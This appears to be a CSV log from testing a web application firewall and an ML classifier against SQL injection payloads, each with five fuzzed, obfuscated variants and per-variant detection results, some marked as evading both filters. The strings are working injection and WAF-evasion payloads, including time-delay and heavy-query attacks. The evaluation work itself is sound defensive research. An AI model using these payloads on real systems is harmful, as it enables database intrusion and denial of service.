Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
1,2024-08-27T11:00:16.363634,"1"""")) as femc where 1313=1313 and 4595=4595#",403,200,403,waf_incorrect_ml_correct,"' AND 1'<>'3$'"""")) AS femc wHEre 1313/**/LIKe 1313
AND 4595=0x11f3#",2024-08-27T11:00:18.754083,403,403,both_correct,"' AND 'O1L'!='O1LJ''<>'3$'"""")) AS/**/femc wHEre  || 0/**/LiKE 1313	ANd 0x11f3=0x11f3#'",2024-08-27T11:00:22.548239,403,200,waf_correct_ml_incorrect,"'	AND 'O1L'!='O1LJ''!='8794<>8795$'"""")) As/**/femc/**/where  ||  AND 1/**/Like (SELECT 1313)	anD 0x11f3=0x11f3#'",2024-08-27T11:00:27.043617,403,200,waf_correct_ml_incorrect,"'	AND 'O1L'!='O1LJ''!='(SELECT 8794)<>2638 NOT LIKE 2639$'"""")) As/**/femc/**/wHEre/*xt*/  OR  	and 1/**/liKE (selecT  AND 1)	And 0x11f3=0x11f3#'",2024-08-27T11:00:32.665768,403,403,both_correct,"'	AND 'O1L'!='O1LJ''!='(SELECT 8794)<>(SELECT 2502)!= OR 0/**/NOT LIKE 2639$'"""")) as/**/femc/**/WHERE/*xt*/
 oR  	aNd 1/**/LIkE (SelEct  AND 1)	aNd 0x11f3 like 0x11f3#'2R",2024-08-27T11:00:40.112361,403,403,both_correct
2,2024-08-27T11:00:49.125847,1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,403,403,403,both_correct,"'Hr'/**/LIKE 'Hr'');begin dbms_lock.sleep( AND 0x1);
end and ('jzlr'='jzlr",2024-08-27T11:00:51.403468,200,200,both_incorrect,'E'!='E>'');begin dbms_lock.sleep( AND 0x1); end and ('jzlr'='jzlr,2024-08-27T11:00:56.315504,200,403,waf_incorrect_ml_correct,"'E'<>'E>'');begin dbms_lock.sleep( AND 0x1); end/**/and
('jzlr'='jzlr",2024-08-27T11:01:00.681948,200,200,both_incorrect,'E'!='E>'');begin dbms_lock.sleep( AND 0x1); end and	('jzlr'='jzlr,2024-08-27T11:01:04.711884,200,403,waf_incorrect_ml_correct,"'E'<>'E>'');begin dbms_lock.sleep( AND/**/0x1); end and
('jzlr'='jzlr",2024-08-27T11:01:08.719990,200,200,both_incorrect
3,2024-08-27T11:01:12.525855,"c/ la hoz, 17",200,200,200,both_correct,"c/
la hoz,/**/(SElEct (SELECT 2524)<>2525)",2024-08-27T11:01:13.144074,200,403,waf_correct_ml_incorrect,"c/	la hoz,/**/(seLect (selEct '2	e' LIKE '2	e')/**/NOT LIKE (SELECT 0x1))",2024-08-27T11:01:15.962518,200,403,waf_correct_ml_incorrect,"c/	la hoz,/**/(sELeCt (select ' OR 0x0	e' lIkE '2	e') NOT	LIKE (seLeCT 0x1))",2024-08-27T11:01:19.992022,200,200,both_correct,"c/	la hoz,/*c\JO)*/(SElECt (SElECT ' OR/**/0x0	e' LikE '0x2	e') NOT	LIKE
(seLECt 0x1))",2024-08-27T11:01:24.086436,403,200,waf_incorrect_ml_correct,"c/	la hoz,/*c\JO)*/(seLEcT
(SELECt ' OR 0x0	e' lIKe '0x2	e') NOT	LIKE
(SELEct 0x1))",2024-08-27T11:01:29.099513,403,403,both_incorrect
4,2024-08-27T11:01:33.979943,"1"""" where 1920=1920 and 8635=(select count(*) from generate_series(1,5000000))--",403,200,403,waf_incorrect_ml_correct,"1"""" WheRe 1920=0x780 anD/**/8635 like (sELEcT
count(*) FroM generate_series((sELeCt '
X'!='
Xv'),5000000))--",2024-08-27T11:01:37.431488,200,200,both_incorrect,"(SeleCT '{'!='{$')""""	wheRe  aNd 1 like 0x780 ANd/**/8635 lIkE (seLeCT
count(*) FrOM/**/generate_series((SeleCt '
X'!='
Xv'),5000000))--",2024-08-27T11:01:42.875014,403,200,waf_correct_ml_incorrect,"(SELeCt '{'!='{$')""""	WheRe  anD	 && 1 lIkE 0x780 aND/**/0x21bb/**/lIke (SElect
count(*) froM/**/generate_series((seLEct '
X'!='
Xv'),9547<>9548))--",2024-08-27T11:01:49.426352,403,200,waf_correct_ml_incorrect,"(seleCT '{'!='{$')""""	WhERE  ANd   AND  'l'='l' lIKe 0x780 aND/**/0x21bb/**/liKe (select
count(*) from/*24*/generate_series((sELEct/**/'
X'!='
Xv'),(sELeCt 1)<>0x254c))--",2024-08-27T11:01:56.893955,403,403,both_correct,"(SELECT '{'!='{$')""""	WHERe  ANd   aNd  'l'='l' Like 0x780 AnD/**/0x21bb/**/lIKE (SelEcT
count(*)/**/fRoM/*a""*/generate_series((SElecT/**/'
X'!='	Xv'),(SelecT 0x1409!= Or 0)!=0x254c))--",2024-08-27T11:02:04.890391,403,200,waf_correct_ml_incorrect
5,2024-08-27T11:02:13.429463,-3520%' or 8571=8571--,403,403,403,both_correct,"-'']'='']'%'/**/OR
0x217b lIke  OR 0--",2024-08-27T11:02:14.434674,200,200,both_incorrect,"-'']'='']'%'/**/OR
0x217b lIKE  OR 0x6e2 like 	AnD/**/1--",2024-08-27T11:02:17.032373,200,200,both_incorrect,-'']'='']'%'/**/or 0x217b LiKE  or 0x6e2 Like 	anD (SELECT 1) lIkE 0x2282--,2024-08-27T11:02:20.830179,200,403,waf_incorrect_ml_correct,"-'']'='']'%'
or 0x217b LiKE  or 0x6e2 Like 	anD (SELECT ''<>',') LIke 0x2282--",2024-08-27T11:02:24.949176,200,403,waf_incorrect_ml_correct,"-'']'='']'%'
or 0x217b LiKE  or 0x6e2 Like 	anD/**/(SELECT ''<>',') lIKe	0x2282--",2024-08-27T11:02:29.315357,200,200,both_incorrect
6,2024-08-27T11:02:33.717016,-2530%' order by 1#,403,403,403,both_correct,"-2530%'/**/order by  OR
(SELECT 0) not like 1886#",2024-08-27T11:02:34.553063,403,403,both_correct,-(SELECT 1)%'/**/order by/**/ or (SElect 0x0) not like '_%w'!='_%w1'#N,2024-08-27T11:02:37.584965,403,403,both_correct,-(SelECT	 aNd (SElecT 'W'<>'W\'))%'/*q*/order by/**//**/or (SElect 0x0) not like '_%w'!='_%w1'#N,2024-08-27T11:02:41.505081,403,200,waf_correct_ml_incorrect,-(SeLeCt/**/ AnD (sELECT 'W' NOT LIKE 'W\'))%'/*q*/order by/**//**/oR (seleCT 0x0) not like '_%w'!='_%w1'#Nqb,2024-08-27T11:02:46.814483,403,403,both_correct,-(sELeCT  And (SEleCt 'W' not like 'W\'))%'/*q*/order by/**//**/OR (SeLect 0x0)	not like '_%w'!='_%w1'#Nqb*,2024-08-27T11:02:52.231120,403,403,both_correct
7,2024-08-27T11:02:58.076267,"nucleo santiago apostol 34, 4?f",200,200,200,both_correct,"nucleo
santiago apostol 3406=/**/OR 0, 0x4?f",2024-08-27T11:02:59.436329,200,200,both_correct,"nucleo santiago apostol (SeLecT 'd' NOT LIKE 'd)') LIKE  oR  OR 0, 0x4?f",2024-08-27T11:03:02.319735,200,403,waf_correct_ml_incorrect,"nucleo santiago apostol (SeLEcT/**/'d' NOT LIKE 'd)') LIkE  Or  Or  OR
(SELECT 'E' not like 'Ef'), 0x4?f",2024-08-27T11:03:06.340739,403,403,both_incorrect,"nucleo santiago apostol (SeleCt 'd' not like 'd)') likE  Or  Or  or (SeLEct 'E' not like 'Ef'), 0x4?f",2024-08-27T11:03:12.069382,200,200,both_correct,"nucleo santiago apostol (sELecT 'd' not like	'd)') like  or  OR/**/ Or (sELEct 'E' not like 'Ef'), 0x4?f",2024-08-27T11:03:17.196778,200,200,both_correct
8,2024-08-27T11:03:22.749806,"1%""""))) union all select null,null--",403,403,403,both_correct,"0x1%"""")))/**/union
all sELecT null,null--",2024-08-27T11:03:24.905263,403,403,both_correct,"0x1%"""")))/*&>P*/union
all	sElECT/**/null,null--",2024-08-27T11:03:28.599245,403,200,waf_correct_ml_incorrect,"0x1%"""")))/**/union	all	sEleCt null,null--",2024-08-27T11:03:31.818803,403,200,waf_correct_ml_incorrect,"0x1%"""")))/*t)R/p*/union	all	SelECT	null,null--",2024-08-27T11:03:34.599214,403,200,waf_correct_ml_incorrect,"0x1%"""")))/*t)R/p*/union all	SElecT	null,null--",2024-08-27T11:03:37.634729,403,403,both_correct
9,2024-08-27T11:03:41.004866,1) as afmb where 8665=8665 order by 1#,403,403,403,both_correct,"'On'!='On?')/**/As afmb where (SeLECT 8665)=8665 order by
1# OR 0^",2024-08-27T11:03:42.635469,403,403,both_correct,"'On'!='On?') as afmb wheRE (SeleCt 8665) lIKe ' 4M<'!=' 4M<Z' order by
(SELect	0x1)# OR 0^z6",2024-08-27T11:03:46.748315,403,200,waf_correct_ml_incorrect,"'On' NOT LIKE 'On?') as afmb Where (Select 'm{'='m{') liKE ' 4M<'!=' 4M<Z'	order by
(SeLecT	0x1)# OR /**/OR 0x0^z6cD",2024-08-27T11:03:51.923186,403,200,waf_correct_ml_incorrect,"'On' not like 'On?') As afmb WherE (SelECT 'm{'='m{') LikE ' 4M<'!=' 4M<Z' order by
(SELeCt	0x1)# OR  OR 0x0^z6cDU",2024-08-27T11:03:58.196545,403,200,waf_correct_ml_incorrect,"'On' not/*'b0*/LIke 'On?') As afmb WHerE (SelEcT 'm{' Like 'm{') lIkE ' 4M<'!=' 4M<Z' order by
(sElECt 0x1)# OR  OR 0x0^z6cDU",2024-08-27T11:04:04.372948,403,200,waf_correct_ml_incorrect
10,2024-08-27T11:04:11.756634,"1%') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('%'='",403,403,403,both_correct,"1%') or (SELECT (SELECT 4181=4181))=(select count(*) from
sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)/*:DW*/and ('%'='",2024-08-27T11:04:16.965761,403,403,both_correct,"3140 NOT LIKE 3141%') or (SELECT (SELECT  AND 1=(SELECT 4181)))=(select count(*) from	sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('%'='",2024-08-27T11:04:24.552107,403,403,both_correct,"3140 not like 3141%') or (SELECT (SELECT  AND  AND 'b8>' NOT LIKE 'b8>D'=(SELECT 0x1055)))=(select count(*) from
sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)/**/and ('%'='",2024-08-27T11:04:32.797540,403,403,both_correct," AND (SELECT 1) not like 1242 NOT LIKE 1243%') or (SELECT (SELECT  AND/**/ AND 'b8>' NOT LIKE 'b8>D'=(SELECT 0x1055)))=(select count(*) from	sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)/*O*/and ('%'='",2024-08-27T11:04:43.827838,403,403,both_correct," anD (seLeCt (SELECT 1)) not like (SElEct 1) not like '
me''='
me''%') or (SELECT (SELECT  AND  AND 'b8>' NOT LIKE 'b8>D'=(SELECT 0x1055)))=(select count(*) from	sysibm.systables as t1,sysibm.systables as	t2,sysibm.systables as t3)/**/and ('%'='",2024-08-27T11:04:57.044335,200,403,waf_incorrect_ml_correct
